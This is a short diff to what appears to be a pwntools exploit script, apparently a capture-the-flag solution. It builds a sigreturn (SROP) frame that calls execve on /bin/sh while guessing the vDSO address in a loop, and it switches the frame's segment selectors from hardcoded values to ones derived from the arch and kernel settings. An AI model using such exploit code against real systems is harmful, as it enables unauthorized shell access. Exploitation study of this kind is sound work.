@@ -18,7 +18,7 @@ while True:
         # vdso.address = base
         log.info("guess vdso@%#x" % vdso.address)
         addr_binsh = g_elf.symbols["buf"]
-        sf = SigreturnFrame(kernel="i386")
+        sf = SigreturnFrame(arch="i386", kernel="amd64")
         sf.eax = constants.SYS_execve
         sf.ebx = addr_binsh
         sf.ecx = 0
@@ -26,10 +26,14 @@ while True:
         sf.eip = 0x557 + vdso.address
 
         # gdb: info reg, to obtain these values
-        sf.cs = 0x23
-        sf.ss = 0x2b
-        sf.ds = 0x2b
-        sf.es = 0x2b
+        #  the segment selector's value is architecture and 
+        #  kernel relative. if we've set the arch and kernel
+        #  in context, the SigreturnFrame will init with proper
+        #  value.
+        # sf.cs = 0x23
+        # sf.ss = 0x2b
+        # sf.ds = 0x2b
+        # sf.es = 0x2b
 
         addr_sigret = 0x571 + vdso.address
         payload = flat([
